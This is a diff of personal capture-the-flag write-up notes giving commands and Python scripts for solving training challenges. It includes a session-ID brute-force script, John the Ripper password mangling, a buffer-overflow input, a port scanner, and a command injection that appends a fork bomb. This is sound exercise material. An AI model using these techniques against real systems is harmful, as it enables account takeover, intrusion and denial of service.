@@ -29,7 +29,9 @@ connect to ftp server:
 ftp services.cyberprotection.agency 2121
 after entering username and password, used ls to list files and "get FLAG.txt" to download the file.
 
-#### Level 9 C06 - Mission Extension
+#### Level 9 
+
+C06 - Mission Extension
 
 connect to server via ssh, and find image files with the following:
 $ find . -name '*' -exec file {} \; | grep -o -P '^.+: \w+ image'
@@ -37,10 +39,15 @@ Once I found the image, I had to exit the ssh connection to the server and estab
 
 $ scp -P26041 9XtXpQhrht@54.229.163.112:./Contents/M5KDAN44 ~/
 
+C09 
+After connecting to the ssh server, $cd .. twice, then run the following command to find the file. 
+$ find ./ -type f -ls | grep "Nov 22"
+$ cat ./etc/protocol
+
 C11
 Uploading the images to aperisolve showed that one had a zip file in it. Extracted it with binwalk -e, which yielded an ELF named "msg". Running it gave the flag. 
 
-Level 9 C10: 
+C10: 
 ```python
 import itertools
 import os
@@ -150,6 +157,13 @@ for secret in wordlist:
 
 C11 - extracted first image using binwalk -e, pw for zipfile was Vidanya_Das
 
+C12 - downloaded an ELF and a wordlist, but none of the wordlist passwords matched exactly- the challenge hinted at using John the Ripper and changing the passwords slightly. So after a little googling, I ran:
+
+$ chmod +x program-x86
+$ john -wordlist="words.txt" -rules --stdout > john.txt 
+$ $ ./program-x86 john.txt 
+
+
 #### Level 11
 
 C02 - had to find an open port between 14000 and 15000:
@@ -191,8 +205,8 @@ for i in range(14000, 15000):
 end_time = time.time()
 print("To all scan all ports it took {} seconds".format(end_time-start_time))
 ```
-#### Level 11
-C02 - 
+
+C03 - 
 ```python
 
 message = [81, 95, 33, 108, 95, 26, 103, 95, 95, 110, 99, 104, 97, 26, 91, 110, 26, 110, 98, 95, 26, 60, 91, 92, 91, 108, 111, 109, 101, 99, 26, 104, 99, 97, 98, 110, 93, 102, 111, 92, 26, 99, 104, 26, 70, 105, 104, 94, 105, 104, 26, 91, 110, 26, 43, 43, 106, 103, 26, 110, 98, 99, 109, 26, 95, 112, 95, 104, 99, 104, 97, 40]
@@ -206,6 +220,31 @@ so running this:
 strings strings3-x86 | xargs -n 1 ./strings3-x86 
 
 gave the flag.
+
+C05 - the images to download wouldn't load, so it was clear there was probably a magic numbers problem. Inserting the first 4 bytes with the jpg magic numbers into the largest image file did the trick - I could open the image and the flag was printed on it.
+
+C06 - had to write a script to post a session id to a URL, the right one was 78:
+
+```python
+import requests
+
+URL = 'https://bondogge.com/createPost?'
+
+file = open("data.txt", "w")
+
+for x in range(1, 100):
+    post_data = {"userID":24,
+                 "sessID":x}
+    data = requests.post(URL, post_data).text
+    file.write(data)
+file.close()
+```
+I opened data.txt to read the data, there was the flag.
+
+C07- I first tried converting de4dc0de to decimal, but that didn't work. Octal did it.
+
+$ ./program-x86 $(printf "00000000000000000\336\300\115\336") 
+Also had to play around with the number of zeros to cause the buffer overflow because changing the number of zeroes changed the output.
 
 #### Level 12
 C04 - Change of Plan
@@ -282,6 +321,32 @@ for i in wordlist:
         else:
             print(decoded)
 ```
+
+C06
+
+Had to use python2 to run this because I still get frustrated with the whole string, bytes issue thing:
+```python
+import socket
+
+host = ("services.cyberprotection.agency", 9999)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(host)
+data = s.recv(2048)
+data = data.strip('\n')
+data = data.split()
+
+print(data)
+
+num = (int(data[0]) * int(data[1]))/int(data[2])
+
+s.send(str(num))
+
+print(s.recv(2048))
+
+s.close()
+```
+
 C08
 Hand to inject: cryptonite -n; :(){ :|:& };: (fork bomb)
 
